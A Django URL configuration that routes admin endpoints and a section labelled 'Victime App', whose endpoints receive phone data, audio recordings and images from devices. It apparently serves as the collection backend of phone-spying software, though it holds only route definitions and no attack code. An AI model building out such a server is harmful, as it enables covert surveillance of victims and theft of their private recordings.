from django.contrib import admin
from django.urls import path
from api import views
from django.conf import settings
from django.conf.urls.static import static


urlpatterns = [
    # Admin App
    path('admin/', admin.site.urls),
    path('list_user', views.List_user.as_view()),
    path('create_user', views.Create_user.as_view()),
    path('login_user', views.Login.as_view()),
    path('forget_password', views.Forget.as_view()),
    path('get_All_device', views.Get_All_device.as_view()),

    # Victime App
    path('phonedata_created', views.Phone_data_created.as_view()),
    path('phoneUpdate/<int:pk>', views.Phone_data_Update.as_view()),
    path('audio', views.Audio_stor.as_view()),
    path('images', views.Image_stor.as_view()),

]
urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
